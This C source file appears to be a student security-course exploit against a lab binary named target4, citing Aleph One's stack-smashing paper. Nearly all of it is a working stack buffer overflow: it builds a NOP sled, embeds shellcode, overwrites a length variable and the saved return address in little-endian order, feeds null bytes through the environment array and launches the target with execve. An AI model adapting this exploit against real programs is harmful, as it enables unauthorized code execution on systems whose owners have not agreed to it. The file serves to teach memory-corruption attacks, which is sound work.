// | Author |    utid 	|   student id	|
// | Ke Li	|   like23 	|	1005842554	|
// | Weiyu Zhang | zha14006 | 1009736706 |
// Reference:
// Smashing The Stack For Fun And Profit - Aleph One
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"
#define DEFAULT_BUFFER_SIZE 189
#define RIP_ADDR 183
#define TARGET "../targets/target4"

int main(void)
{
  char *args[3];
  char *env[9];

  // buf addr: 0x3021fdf0
  unsigned long buf_addr = 0x3021fdf0;
  // i addr: 0x3021fe98 -> not overwrite
  // len addr: 0x3021fe9c -> overwrite to 189
  // $rbp at 0x3021fea0, $rip at 0x3021fea8

  // 0x3021fea8 - 0x3021fdf0 == 184
  // 184 + 4 byte long addr + 1 null byte = 189

  char buff[DEFAULT_BUFFER_SIZE];
	int i; 

  // NOP sled
  // 
	for (i = 0; i < 168; i++) 
        buff[i] = '\x90';

	// shellcode
	int iter_shell;
	iter_shell = 0;
	for (i = 16; i < (16 + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}

  // reset to 0 
  // use the for loop to increase the address 
  buff[168] = '\x00';

  // overwrite len to 188 - 168 = 20 = \x14
  // cuz every loop iteration we increase the pointer a and b
  buff[172] = '\x14';

  // after len up until $rip
  for(i = 176; i < 184;i++){
    buff[i] = '\x90';
  }

  // $rip
  // Each iteration of the loop copies the 64-bit address into the buffer
	// Copy the address into the buffer, byte by byte, in little-endian order
	buff[0 + RIP_ADDR] = buf_addr & 0xFF;              // Byte 0
	buff[1 + RIP_ADDR] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + RIP_ADDR] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + RIP_ADDR] = (buf_addr >> 24) & 0xFF;  // Byte 3
	buff[4 + RIP_ADDR] = '\x00';

  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;

  // null byte for i
  env[0] = &buff[169];
  env[1] = &buff[170];
  env[2] = &buff[171];
  // null byte for len
  env[3] = &buff[172];
  env[4] = &buff[173];
  env[5] = &buff[174];
  env[6] = &buff[175];
  env[7] = &buff[176];
  env[8] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
